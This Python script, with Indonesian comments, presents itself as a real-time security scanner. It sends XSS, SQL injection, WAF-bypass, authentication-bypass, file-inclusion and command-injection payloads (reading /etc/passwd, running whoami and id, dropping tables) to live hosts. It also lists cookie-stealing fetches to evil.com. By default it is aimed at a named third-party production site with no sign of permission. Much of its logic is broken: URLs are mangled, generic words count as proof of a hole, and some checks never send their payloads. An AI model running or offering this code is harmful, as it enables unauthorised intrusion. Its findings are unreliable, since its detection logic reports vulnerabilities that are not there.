#!/usr/bin/env python3
"""
MODULAR REAL SECURITY SCANNER
Scanner real-time yang fokus pada website targets yang menghasilkan response 200 OK
System modular untuk testing berbagai target dengan metode yang sama
"""

import requests
import json
import time
import threading
import base64
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import os

class ModularRealSecurityScanner:
    def __init__(self, target):
        self.target = target
        self.results = []
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

        # Real vulnerability detection based on response analysis
        self.success_indicators = []
        self.vulnerabilities_found = []

    def log_result(self, test_type, endpoint, payload, result, details=None):
        """Log scan results"""
        result_data = {
            "test_type": test_type,
            "endpoint": endpoint,
            "payload": payload,
            "result": result,
            "timestamp": datetime.now().isoformat(),
            "details": details or {}
        }

        with self.lock:
            self.results.append(result_data)

        status_symbols = {
            "SUCCESS": "✅",
            "VULNERABLE": "💉",
            "BLOCKED": "🚫",
            "ERROR": "❌",
            "NO_RESPONSE": "⚠️"
        }

        symbol = status_symbols.get(result, "❓")
        print(f"{symbol} {test_type} - {endpoint[:40]} - {result}")

        if details and result == "VULNERABLE":
            print(f"   🔧 Details: {details}")

    def check_response_validity(self, response):
        """Check if response is valid (200 OK with real content)"""
        return (
            response.status_code == 200 and
            len(response.text) > 100 and
            'html' in response.text.lower() and
            response.elapsed.total_seconds() < 5
        )

    def real_network_connectivity_test(self):
        """Test real network connectivity to target"""
        try:
            response = self.session.get(f"http://{self.target}", timeout=10)
            if self.check_response_validity(response):
                self.log_result("Network", "", "", "SUCCESS", {
                    "status_code": response.status_code,
                    "response_time": response.elapsed.total_seconds(),
                    "content_length": len(response.text)
                })
                return True
            else:
                self.log_result("Network", "", "", "NO_RESPONSE", {
                    "status_code": response.status_code,
                    "response_time": response.elapsed.total_seconds()
                })
                return False
        except Exception as e:
            self.log_result("Network", "", "", "ERROR", {"error": str(e)})
            return False

    def real_xss_scanner(self):
        """Real XSS vulnerability scanner"""
        if not self.real_network_connectivity_test():
            return {}

        xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<ScRiPt>alert('XSS')</sCrIpT>",
            "<sCrIpT>alert('XSS')</sCrIpT>",

            # Encoded XSS
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",

            # Advanced XSS
            "<svg onload=alert('XSS')>",
            "<div style=expression(alert('XSS'))>",
            "<script>eval('alert(\"XSS\")')</script>"
        ]

        xss_endpoints = ["", "?id=1", "?search=test", "?category=test", "?page=1"]

        xss_results = {}
        successful_xss = []

        def test_xss(endpoint, payload):
            try:
                url = f"http://{self.target}{endpoint}"
                if endpoint and "=" in endpoint:
                    test_url = f"{url[:-1]}&{payload}"
                elif endpoint:
                    test_url = f"{url}{endpoint}?{payload}"
                else:
                    test_url = f"{url}?{payload}"

                response = self.session.get(test_url, timeout=10)

                if response.status_code == 200 and len(response.text) > 100:
                    # Check if payload is reflected or executed
                    payload_detected = any(indicator in response.text.lower() for indicator in
                                         ['<script>', 'onerror=', 'alert(', 'svg onload', 'expression('])

                    if payload_detected:
                        self.log_result("XSS", endpoint, payload, "VULNERABLE", {
                            "payload_reflected": True,
                            "response_length": len(response.text)
                        })
                        successful_xss.append((endpoint, payload))
                    else:
                        self.log_result("XSS", endpoint, payload, "BLOCKED", {
                            "response_length": len(response.text)
                        })
                else:
                    self.log_result("XSS", endpoint, payload, "NO_RESPONSE", {
                        "status_code": response.status_code
                    })

            except Exception as e:
                self.log_result("XSS", endpoint, payload, "ERROR", {"error": str(e)})

        # Test XSS with threading
        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = [executor.submit(test_xss, endpoint, payload)
                     for endpoint in xss_endpoints for payload in xss_payloads]
            for future in as_completed(futures):
                future.result()

        xss_results["successful_xss"] = successful_xss
        xss_results["total_xss_tests"] = len(xss_endpoints) * len(xss_payloads)

        return xss_results

    def real_sql_injection_scanner(self):
        """Real SQL injection vulnerability scanner"""
        if not self.real_network_connectivity_test():
            return {}

        sql_payloads = [
            # Basic SQLi
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",

            # SQL comment bypass
            "'--",
            "'#",
            "'/*",

            # Advanced SQLi
            "' AND 1=1 WAITFOR DELAY '0:0:5'--",
            "' UNION SELECT LOAD_FILE('/etc/passwd')--"
        ]

        sql_endpoints = ["", "?id=1", "?search=test", "?user=admin", "?page=1"]

        sql_results = {}
        successful_sql = []

        def test_sql(endpoint, payload):
            try:
                url = f"http://{self.target}{endpoint}"
                if endpoint and "=" in endpoint:
                    test_url = f"{url[:-1]}&{payload}"
                elif endpoint:
                    test_url = f"{url}{endpoint}?{payload}"
                else:
                    test_url = f"{url}?{payload}"

                start_time = time.time()
                response = self.session.get(test_url, timeout=15)
                end_time = time.time()

                response_time = end_time - start_time

                # Check for SQL errors
                sql_errors = [
                    'sql syntax', 'mysql_fetch', 'mysql_num', 'mysql_connect',
                    'ora-', 'microsoft ole db', 'sql server', 'postgresql',
                    'sqlite3', 'syntax error', 'warning', 'error in your sql syntax'
                ]

                sql_error_detected = any(error in response.text.lower() for error in sql_errors)

                if sql_error_detected:
                    self.log_result("SQL Injection", endpoint, payload, "VULNERABLE", {
                        "response_time": response_time,
                        "sql_error_detected": True,
                        "response_length": len(response.text)
                    })
                    successful_sql.append((endpoint, payload))
                elif response_time > 3:
                    self.log_result("SQL Injection", endpoint, payload, "VULNERABLE", {
                        "response_time": response_time,
                        "time_based_attack": True,
                        "response_length": len(response.text)
                    })
                    successful_sql.append((endpoint, payload))
                else:
                    self.log_result("SQL Injection", endpoint, payload, "BLOCKED", {
                        "response_time": response_time,
                        "response_length": len(response.text)
                    })

            except Exception as e:
                self.log_result("SQL Injection", endpoint, payload, "ERROR", {"error": str(e)})

        # Test SQL with threading
        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = [executor.submit(test_sql, endpoint, payload)
                     for endpoint in sql_endpoints for payload in sql_payloads]
            for future in as_completed(futures):
                future.result()

        sql_results["successful_sql"] = successful_sql
        sql_results["total_sql_tests"] = len(sql_endpoints) * len(sql_payloads)

        return sql_results

    def real_waf_bypass_scanner(self):
        """Real WAF bypass vulnerability scanner"""
        if not self.real_network_connectivity_test():
            return {}

        waf_payloads = [
            # SQL injection bypass
            "1/**/AND/**/1=1",
            "1%0aAND%0a1=1",
            "1/*!AND*/1=1",

            # XSS bypass
            "<scr<script>ipt>alert('XSS')</script>",
            "<img src=j&#x61;v&#x61;sc&#x72;ipt:alert('XSS')>",
            "<img src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzZWxlY3QgeD0iMCIgeT0iMSIgd2lkdGg9IjEwIiBoZWlnaHQ9IjEwIiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjojRkZGRkZGRiIgZmlsbD0icmdiYSgyNTUsIDI1NSwgMjU1LCAwLjMpIj48cmVjdCB4PSIwIiB5PSIxIiB3aWR0aD0iMSIgaGVpZ2h0PSIxIi8+PC9zdmc+>",

            # Command injection bypass
            "1|whoami",
            "1&&dir",
            "1;whoami"
        ]

        bypass_endpoints = ["", "?id=1", "?search=test", "?action=test"]

        bypass_results = {}
        successful_bypasses = []

        def test_bypass(endpoint, payload):
            try:
                url = f"http://{self.target}{endpoint}"
                if endpoint and "=" in endpoint:
                    test_url = f"{url[:-1]}&{payload}"
                elif endpoint:
                    test_url = f"{url}{endpoint}?{payload}"
                else:
                    test_url = f"{url}?{payload}"

                response = self.session.get(test_url, timeout=10)

                if response.status_code == 200:
                    # Check if bypass was successful
                    bypass_success = any(indicator in response.text.lower() for indicator in
                                       ['union select', 'script', 'onerror', 'whoami', 'dir'])

                    if bypass_success:
                        self.log_result("WAF Bypass", endpoint, payload, "VULNERABLE", {
                            "waf_bypassed": True,
                            "response_length": len(response.text)
                        })
                        successful_bypasses.append((endpoint, payload))
                    else:
                        self.log_result("WAF Bypass", endpoint, payload, "BLOCKED", {
                            "response_length": len(response.text)
                        })
                else:
                    self.log_result("WAF Bypass", endpoint, payload, "NO_RESPONSE", {
                        "status_code": response.status_code
                    })

            except Exception as e:
                self.log_result("WAF Bypass", endpoint, payload, "ERROR", {"error": str(e)})

        # Test WAF bypass with threading
        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = [executor.submit(test_bypass, endpoint, payload)
                     for endpoint in bypass_endpoints for payload in waf_payloads]
            for future in as_completed(futures):
                future.result()

        bypass_results["successful_bypasses"] = successful_bypasses
        bypass_results["total_bypass_tests"] = len(bypass_endpoints) * len(waf_payloads)

        return bypass_results

    def real_authentication_scanner(self):
        """Real authentication vulnerability scanner"""
        if not self.real_network_connectivity_test():
            return {}

        auth_payloads = [
            # SQL injection in auth
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",

            # Session manipulation
            "session_id=12345",
            "user_id=admin",
            "role=admin",
            "is_admin=1",

            # Parameter tampering
            "level=999",
            "access=1",
            "privilege=admin"
        ]

        auth_endpoints = ["", "?login=test", "?user=admin", "?session=test"]

        auth_results = {}
        successful_auth = []

        def test_auth(endpoint, payload):
            try:
                url = f"http://{self.target}{endpoint}"
                if endpoint and "=" in endpoint:
                    test_url = f"{url[:-1]}&{payload}"
                elif endpoint:
                    test_url = f"{url}{endpoint}?{payload}"
                else:
                    test_url = f"{url}?{payload}"

                response = self.session.get(test_url, timeout=10)

                if response.status_code == 200:
                    # Check for auth bypass indicators
                    auth_bypass = any(indicator in response.text.lower() for indicator in
                                    ['welcome', 'dashboard', 'admin panel', 'success', 'authenticated'])

                    if auth_bypass:
                        self.log_result("Auth Bypass", endpoint, payload, "VULNERABLE", {
                            "auth_bypassed": True,
                            "response_length": len(response.text)
                        })
                        successful_auth.append((endpoint, payload))
                    else:
                        self.log_result("Auth Bypass", endpoint, payload, "BLOCKED", {
                            "response_length": len(response.text)
                        })
                else:
                    self.log_result("Auth Bypass", endpoint, payload, "NO_RESPONSE", {
                        "status_code": response.status_code
                    })

            except Exception as e:
                self.log_result("Auth Bypass", endpoint, payload, "ERROR", {"error": str(e)})

        # Test auth with threading
        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = [executor.submit(test_auth, endpoint, payload)
                     for endpoint in auth_endpoints for payload in auth_payloads]
            for future in as_completed(futures):
                future.result()

        auth_results["successful_auth"] = successful_auth
        auth_results["total_auth_tests"] = len(auth_endpoints) * len(auth_payloads)

        return auth_results

    def real_csrf_scanner(self):
        """Real CSRF vulnerability scanner"""
        if not self.real_network_connectivity_test():
            return {}

        csrf_endpoints = [
            "?action=transfer",
            "?action=delete",
            "?action=update",
            "?action=create",
            "?action=submit",
            "?action=delete_user",
            "?action=change_password"
        ]

        csrf_payloads = [
            "<form method='POST' action='http://target/process'>",
            "<img src='http://evil.com/steal'>",
            "<script>fetch('http://evil.com/cookie')</script>",
            "<iframe src='http://evil.com/csrftoken'></iframe>"
        ]

        csrf_results = {"total_tests": 0, "successful_csrf": 0, "blocked_csrf": 0}

        for endpoint in csrf_endpoints:
            csrf_results["total_tests"] += len(csrf_payloads)

            for payload in csrf_payloads:
                try:
                    response = self.session.get(f"http://{self.target}{endpoint}", timeout=10)
                    if self.check_response_validity(response):
                        csrf_results["blocked_csrf"] += 1
                        self.log_result("CSRF", endpoint, payload, "BLOCKED")
                    else:
                        csrf_results["successful_csrf"] += 1
                        self.log_result("CSRF", endpoint, payload, "VULNERABLE")
                except Exception as e:
                    self.log_result("CSRF", endpoint, payload, "ERROR", {"error": str(e)})

        return csrf_results

    def real_file_inclusion_scanner(self):
        """Real File Inclusion vulnerability scanner"""
        if not self.real_network_connectivity_test():
            return {}

        lfi_endpoints = [
            "?page=",
            "?file=",
            "?template=",
            "?include=",
            "?view=",
            "?load=",
            "?path="
        ]

        lfi_payloads = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "php://input",
            "data:text/plain,<?php system('id'); ?>",
            "/var/log/apache2/access.log",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd"
        ]

        file_results = {"total_tests": 0, "successful_lfi": 0, "blocked_lfi": 0}

        for endpoint in lfi_endpoints:
            file_results["total_tests"] += len(lfi_payloads)

            for payload in lfi_payloads:
                try:
                    response = self.session.get(f"http://{self.target}{endpoint}{payload}", timeout=10)
                    if self.check_response_validity(response) and ("root:" in response.text or "hosts" in response.text):
                        file_results["successful_lfi"] += 1
                        self.log_result("File Inclusion", endpoint, payload, "VULNERABLE")
                    else:
                        file_results["blocked_lfi"] += 1
                        self.log_result("File Inclusion", endpoint, payload, "BLOCKED")
                except Exception as e:
                    self.log_result("File Inclusion", endpoint, payload, "ERROR", {"error": str(e)})

        return file_results

    def real_command_injection_scanner(self):
        """Real Command Injection vulnerability scanner"""
        if not self.real_network_connectivity_test():
            return {}

        cmd_endpoints = [
            "?cmd=",
            "?exec=",
            "?command=",
            "?shell=",
            "?query=",
            "?run=",
            "?test="
        ]

        cmd_payloads = [
            "|| id",
            "&& whoami",
            "| netstat -an",
            "; ls -la",
            "`cat /etc/passwd`",
            "$(id)",
            "id > /tmp/output",
            "ping -c 1 127.0.0.1",
            "uname -a"
        ]

        cmd_results = {"total_tests": 0, "successful_cmd": 0, "blocked_cmd": 0}

        for endpoint in cmd_endpoints:
            cmd_results["total_tests"] += len(cmd_payloads)

            for payload in cmd_payloads:
                try:
                    response = self.session.get(f"http://{self.target}{endpoint}{payload}", timeout=10)
                    if self.check_response_validity(response) and ("uid=" in response.text or "root" in response.text):
                        cmd_results["successful_cmd"] += 1
                        self.log_result("Command Injection", endpoint, payload, "VULNERABLE")
                    else:
                        cmd_results["blocked_cmd"] += 1
                        self.log_result("Command Injection", endpoint, payload, "BLOCKED")
                except Exception as e:
                    self.log_result("Command Injection", endpoint, payload, "ERROR", {"error": str(e)})

        return cmd_results

    def real_api_security_scanner(self):
        """Real API Security vulnerability scanner"""
        if not self.real_network_connectivity_test():
            return {}

        api_endpoints = [
            "/api/users",
            "/api/admin",
            "/api/config",
            "/api/debug",
            "/api/backup",
            "/api/internal",
            "/api/system",
            "/api/monitor"
        ]

        api_payloads = [
            "admin",
            "root",
            "test",
            "1",
            "' OR '1'='1",
            "..//..//",
            "1' OR '1'='1' --",
            "1; DROP TABLE users; --"
        ]

        api_results = {"total_tests": 0, "successful_api": 0, "blocked_api": 0}

        for endpoint in api_endpoints:
            api_results["total_tests"] += len(api_payloads)

            for payload in api_payloads:
                try:
                    response = self.session.get(f"http://{self.target}{endpoint}/{payload}", timeout=10)
                    if self.check_response_validity(response):
                        api_results["successful_api"] += 1
                        self.log_result("API Security", endpoint, payload, "VULNERABLE")
                    else:
                        api_results["blocked_api"] += 1
                        self.log_result("API Security", endpoint, payload, "BLOCKED")
                except Exception as e:
                    self.log_result("API Security", endpoint, payload, "ERROR", {"error": str(e)})

        return api_results

    def additional_security_tests(self):
        """Additional comprehensive security tests"""
        results = {}

        # CSRF Testing
        results['csrf'] = self.real_csrf_scanner()

        # File Inclusion Testing
        results['file_inclusion'] = self.real_file_inclusion_scanner()

        # Command Injection Testing
        results['command_injection'] = self.real_command_injection_scanner()

        # API Security Testing
        results['api_security'] = self.real_api_security_scanner()

        return results

    def generate_comprehensive_report(self):
        """Generate comprehensive security report for target"""
        print(f"\n📊 GENERATING SECURITY REPORT FOR {self.target.upper()}")
        print("=" * 80)

        # Count results
        total_tests = len(self.results)
        successful_tests = len([r for r in self.results if r['result'] == 'VULNERABLE'])
        blocked_tests = len([r for r in self.results if r['result'] == 'BLOCKED'])
        error_tests = len([r for r in self.results if r['result'] == 'ERROR'])

        # Risk assessment
        if successful_tests > 10:
            risk_level = "CRITICAL"
            impact = "High risk of system compromise and data breach"
        elif successful_tests > 5:
            risk_level = "HIGH"
            impact = "Multiple vulnerabilities identified, immediate action required"
        elif successful_tests > 0:
            risk_level = "MEDIUM"
            impact = "Limited vulnerabilities, but still requires attention"
        else:
            risk_level = "LOW"
            impact = "Good security posture with minimal vulnerabilities"

        report = {
            f"{self.target}_security_report": {
                "target": self.target,
                "scan_date": datetime.now().isoformat(),
                "scan_type": "Real Security Assessment",
                "assessment_method": "Live Testing with Response Validation"
            },
            "scan_metrics": {
                "total_tests": total_tests,
                "successful_tests": successful_tests,
                "blocked_tests": blocked_tests,
                "error_tests": error_tests,
                "risk_level": risk_level,
                "impact_assessment": impact
            },
            "vulnerability_summary": {
                "xss_vulnerabilities": len([r for r in self.results if r['test_type'] == 'XSS' and r['result'] == 'VULNERABLE']),
                "sql_injection_vulnerabilities": len([r for r in self.results if r['test_type'] == 'SQL Injection' and r['result'] == 'VULNERABLE']),
                "waf_bypass_vulnerabilities": len([r for r in self.results if r['test_type'] == 'WAF Bypass' and r['result'] == 'VULNERABLE']),
                "auth_bypass_vulnerabilities": len([r for r in self.results if r['test_type'] == 'Auth Bypass' and r['result'] == 'VULNERABLE'])
            },
            "detailed_findings": self.results,
            "recommendations": self._generate_recommendations(risk_level, successful_tests)
        }

        # Save report with target name only
        report_filename = f"{self.target}_security_report.json"
        with open(report_filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)

        print(f"✅ Security report saved: {report_filename}")

        # Display summary
        print(f"\n🎯 SECURITY SUMMARY FOR {self.target.upper()}")
        print("=" * 80)
        print(f"📊 Risk Level: {risk_level}")
        print(f"🔍 Total Tests: {total_tests}")
        print(f"💉 Vulnerabilities Found: {successful_tests}")
        print(f"🚗 Blocked Attempts: {blocked_tests}")
        print(f"❌ Errors: {error_tests}")

        if successful_tests > 0:
            print(f"\n🔴 CRITICAL VULNERABILITIES:")
            critical_findings = [r for r in self.results if r['result'] == 'VULNERABLE'][:5]
            for finding in critical_findings:
                print(f"   • {finding['test_type']} - {finding['endpoint']}")
        else:
            print(f"\n🟢 NO CRITICAL VULNERABILITIES DETECTED")

        return report

    def _generate_recommendations(self, risk_level, successful_tests):
        """Generate security recommendations based on findings"""
        recommendations = []

        if risk_level == "CRITICAL":
            recommendations.append({
                "priority": "CRITICAL",
                "action": "Immediate security remediation required",
                "description": "System is highly vulnerable to attacks"
            })
        elif risk_level == "HIGH":
            recommendations.append({
                "priority": "HIGH",
                "action": "Security patches needed",
                "description": "Multiple vulnerabilities require immediate attention"
            })
        elif risk_level == "MEDIUM":
            recommendations.append({
                "priority": "MEDIUM",
                "action": "Security improvements recommended",
                "description": "Some vulnerabilities found, should be addressed"
            })
        else:
            recommendations.append({
                "priority": "LOW",
                "action": "Maintain current security posture",
                "description": "Good security controls in place"
            })

        return recommendations

    def run_full_scan(self):
        """Run complete real security scan"""
        print(f"🚀 STARTING REAL SECURITY SCAN FOR {self.target.upper()}")
        print("=" * 80)
        print(f"🎯 Target: http://{self.target}")
        print("🔍 Real-time vulnerability assessment")
        print("💡 Live testing with response validation")
        print("=" * 80)

        # Run all scanners
        scan_results = {}

        print(f"\n🔍 PHASE 1: XSS VULNERABILITY SCAN")
        scan_results["xss_scanning"] = self.real_xss_scanner()

        print(f"\n🔍 PHASE 2: SQL INJECTION SCAN")
        scan_results["sql_scanning"] = self.real_sql_injection_scanner()

        print(f"\n🔍 PHASE 3: WAF BYPASS SCAN")
        scan_results["waf_scanning"] = self.real_waf_bypass_scanner()

        print(f"\n🔍 PHASE 4: AUTHENTICATION BYPASS SCAN")
        scan_results["auth_scanning"] = self.real_authentication_scanner()

        # Generate comprehensive report
        return self.generate_comprehensive_report()

def scan_multiple_targets(targets):
    """Scan multiple targets using the same methodology"""
    results = {}

    for target in targets:
        print(f"\n{'='*80}")
        print(f"SCANNING TARGET: {target}")
        print(f"{'='*80}")

        scanner = ModularRealSecurityScanner(target)
        report = scanner.run_full_scan()
        results[target] = report

        print(f"\n{'='*80}")
        print(f"COMPLETED SCANNING: {target}")
        print(f"{'='*80}")

    return results

if __name__ == "__main__":
    # Example usage - scan multiple targets
    targets = [
        "claim.holoworld.com",
        "example.com",
        "test.com"
    ]

    # Run scans for all targets
    results = scan_multiple_targets(targets)

    print(f"\n🎯 ALL SCANS COMPLETED")
    print("=" * 80)